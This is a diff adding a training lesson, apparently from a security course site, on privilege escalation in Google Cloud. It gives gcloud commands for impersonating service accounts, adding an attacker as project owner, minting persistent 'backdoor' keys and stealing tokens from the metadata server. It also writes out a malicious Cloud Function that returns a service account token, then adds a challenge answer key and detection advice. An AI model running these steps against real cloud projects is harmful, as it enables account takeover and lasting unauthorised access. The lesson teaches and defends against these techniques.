@@ -1,0 +1,355 @@
+---
+title: "GCP Privilege Escalation"
+description: "Learn to identify and exploit privilege escalation paths in Google Cloud Platform."
+difficulty: "Advanced"
+estimatedTime: "50 minutes"
+tags: ["cloud-security", "gcp", "privilege-escalation", "iam"]
+---
+
+# GCP Privilege Escalation
+
+<InfoBox type="tip" title="Google's Cloud Kingdom">
+GCP's IAM model is powerful but complex. Like AWS and Azure, misconfigurations can lead attackers from a single compromised account to full cloud domination.
+</InfoBox>
+
+## Understanding GCP IAM
+
+### Key Concepts
+
+| Concept | Description |
+|---------|-------------|
+| **Organization** | Top-level container (company domain) |
+| **Folders** | Hierarchical grouping of projects |
+| **Projects** | Logical container for resources |
+| **Service Accounts** | Non-human identities for services |
+| **Roles** | Collections of permissions |
+| **IAM Policy** | Bindings of principals to roles |
+
+### Permission Hierarchy
+
+```
+Organization → Folders → Projects → Resources
+     │             │          │          │
+     └─────────────┴──────────┴──────────┘
+              Permissions inherit downward
+```
+
+---
+
+## Reconnaissance
+
+### Initial Enumeration
+
+<TerminalWindow title="GCP Enumeration">
+# Authenticate (if you have a service account key)
+gcloud auth activate-service-account --key-file=key.json
+
+# Or as a user
+gcloud auth login
+
+# Get current identity
+gcloud auth list
+gcloud config get-value project
+
+# List projects I can access
+gcloud projects list
+
+# List my permissions on a project
+gcloud projects get-iam-policy PROJECT_ID
+
+# Enumerate service accounts
+gcloud iam service-accounts list
+
+# Find what's running
+gcloud compute instances list
+gcloud functions list
+gcloud run services list
+</TerminalWindow>
+
+### Service Account Key Hunting
+
+<TerminalWindow title="Finding SA Keys">
+# Service account keys are JSON files
+# Search for them in:
+# - Source code repos
+# - Build artifacts
+# - Environment variables
+# - Secrets managers
+
+# Common filenames:
+*.json (look for "type": "service_account")
+credentials.json
+service-account.json
+gcp-key.json
+
+# In code, look for:
+google.auth.default()
+service_account.Credentials.from_service_account_file()
+</TerminalWindow>
+
+---
+
+## Privilege Escalation Techniques
+
+### 1. Service Account Impersonation
+
+<TerminalWindow title="Impersonate Service Account">
+# If you have iam.serviceAccountTokenCreator role:
+gcloud config set auth/impersonate_service_account TARGET_SA@project.iam.gserviceaccount.com
+
+# All subsequent commands run as that SA
+gcloud compute instances list
+
+# Generate access token for target SA
+gcloud auth print-access-token --impersonate-service-account TARGET_SA@project.iam.gserviceaccount.com
+</TerminalWindow>
+
+### 2. IAM Policy Modification
+
+<TerminalWindow title="Grant Yourself Permissions">
+# If you have resourcemanager.projects.setIamPolicy:
+
+# Get current policy
+gcloud projects get-iam-policy PROJECT_ID --format=json > policy.json
+
+# Add yourself as owner
+# Edit policy.json:
+{
+  "bindings": [
+    {
+      "members": ["user:attacker@gmail.com"],
+      "role": "roles/owner"
+    }
+  ]
+}
+
+# Apply modified policy
+gcloud projects set-iam-policy PROJECT_ID policy.json
+</TerminalWindow>
+
+### 3. Service Account Key Creation
+
+<TerminalWindow title="Create SA Key">
+# If you have iam.serviceAccountKeys.create:
+
+# Create a new key for any SA you can manage
+gcloud iam service-accounts keys create key.json \
+    --iam-account TARGET_SA@project.iam.gserviceaccount.com
+
+# Now you have persistent access as that SA
+# Even if your original access is revoked!
+</TerminalWindow>
+
+### 4. Compute Instance Access
+
+<TerminalWindow title="Pivot via Compute">
+# GCE instances have default SA with scopes
+# If you can SSH to an instance:
+
+# Get the VM's access token
+curl -H "Metadata-Flavor: Google" \
+    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+
+# Get SA email
+curl -H "Metadata-Flavor: Google" \
+    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
+
+# Use token in gcloud
+gcloud config set account SA@project.iam.gserviceaccount.com
+gcloud auth activate-service-account --access-token=$TOKEN
+</TerminalWindow>
+
+### 5. Cloud Functions Exploitation
+
+<TerminalWindow title="Abuse Cloud Functions">
+# Cloud Functions run as service accounts
+# If you can deploy functions (cloudfunctions.functions.create)
+
+# Create malicious function
+cat > main.py << EOF
+import os
+def pwn(request):
+    # Steal SA token
+    token = os.popen("gcloud auth print-access-token").read()
+    return f"Token: {token}"
+EOF
+
+# Deploy with target SA
+gcloud functions deploy pwn \
+    --runtime python39 \
+    --trigger-http \
+    --service-account TARGET_SA@project.iam.gserviceaccount.com
+
+# Invoke to get token
+curl https://us-central1-project.cloudfunctions.net/pwn
+</TerminalWindow>
+
+---
+
+## Dangerous Permissions
+
+### Top Privilege Escalation Permissions
+
+<TerminalWindow title="High-Risk Permissions">
+# IAM Permissions
+iam.serviceAccountKeys.create          # Create SA keys
+iam.serviceAccountTokenCreator         # Impersonate SAs
+iam.serviceAccounts.actAs              # Use SA for resources
+resourcemanager.projects.setIamPolicy  # Modify IAM
+
+# Compute Permissions  
+compute.instances.setServiceAccount    # Change VM's SA
+compute.instances.setMetadata          # Add SSH keys
+
+# Cloud Functions
+cloudfunctions.functions.create        # Deploy functions as SA
+cloudfunctions.functions.update        # Modify existing functions
+
+# Run
+run.services.create                    # Create Cloud Run services
+
+# Secret Manager
+secretmanager.versions.access          # Read secrets
+</TerminalWindow>
+
+---
+
+## Tools for GCP Security
+
+| Tool | Purpose |
+|------|---------|
+| **GCPBucketBrute** | Bucket enumeration |
+| **ScoutSuite** | Multi-cloud security audit |
+| **Hayat** | GCP privilege escalation |
+| **gcp_scanner** | GCP enumeration |
+| **Cartography** | Cloud asset mapping |
+
+<TerminalWindow title="Using ScoutSuite">
+# Install
+pip install scoutsuite
+
+# Authenticate
+gcloud auth application-default login
+
+# Run audit
+scout gcp --project-id PROJECT_ID
+
+# Review HTML report
+# Look for:
+# - Overly permissive IAM
+# - Public storage buckets
+# - Exposed compute instances
+# - Service account key issues
+</TerminalWindow>
+
+---
+
+<ChallengeBox 
+  title="GCP Privilege Escalation Chain"
+  difficulty="hard"
+  points={250}
+>
+
+You've compromised a GCP service account with these permissions:
+```
+iam.serviceAccountKeys.create on project level
+compute.instances.list
+storage.objects.list
+```
+
+**Questions**:
+1. Can you escalate privileges? How?
+2. What would be your target service account?
+3. How would you achieve persistence?
+
+<details>
+<summary>Answer</summary>
+
+**1. Yes! Escalation Path**:
+- `iam.serviceAccountKeys.create` allows creating keys for ANY service account you can list
+- Even if you can't use them directly, having a key = persistent access
+
+**2. Target Selection**:
+```bash
+# List all service accounts
+gcloud iam service-accounts list
+
+# Look for:
+# - compute-admin@project.iam.gserviceaccount.com
+# - PROJECT_ID@appspot.gserviceaccount.com (App Engine default)
+# - Anything with "admin" or "owner" roles
+```
+
+**3. Achieve Persistence**:
+```bash
+# Create key for high-privilege SA
+gcloud iam service-accounts keys create backdoor.json \
+    --iam-account compute-admin@project.iam.gserviceaccount.com
+
+# Store key safely
+# Use this key even after your original access is revoked
+gcloud auth activate-service-account --key-file=backdoor.json
+```
+
+**Bonus**: Check the default compute SA - often has excessive permissions!
+
+</details>
+</ChallengeBox>
+
+---
+
+## Defense & Detection
+
+### Cloud Audit Logs
+
+Monitor for:
+- `SetIamPolicy` changes
+- `CreateServiceAccountKey`
+- `ActAs` operations
+- Unusual metadata server queries
+
+<TerminalWindow title="Enable Audit Logging">
+# Enable Data Access logs
+gcloud projects get-iam-policy PROJECT_ID
+
+# In audit configs, enable:
+# - Admin Read
+# - Admin Write  
+# - Data Read
+# - Data Write an
+
+# Monitor in Cloud Logging
+resource.type="iam_role" OR
+resource.type="service_account" OR
+protoPayload.methodName="SetIamPolicy"
+</TerminalWindow>
+
+### Best Practices
+
+1. **Least privilege** - Use predefined roles, avoid primitive roles
+2. **No SA keys** - Use workload identity federation
+3. **Rotate keys** - If keys exist, rotate every 90 days
+4. **VPC Service Controls** - Limit data exfiltration
+5. **Organization policies** - Restrict dangerous actions
+
+---
+
+## Key Takeaways
+
+- GCP IAM inherits **top-down** (Org → Folder → Project)
+- **Service account keys** are a major attack vector
+- **iam.serviceAccountTokenCreator** = impersonation power
+- Use **ScoutSuite** for security auditing
+- Avoid **primitive roles** (Owner, Editor, Viewer)
+
+<Quiz
+  question="Which GCP permission allows an attacker to create long-lived credentials for any service account?"
+  options={[
+    "compute.instances.create",
+    "iam.serviceAccountKeys.create",
+    "storage.objects.create",
+    "cloudfunctions.functions.create"
+  ]}
+  correctIndex={1}
+  explanation="iam.serviceAccountKeys.create allows creating JSON key files for service accounts, providing persistent access independent of the original attack vector."
+/>
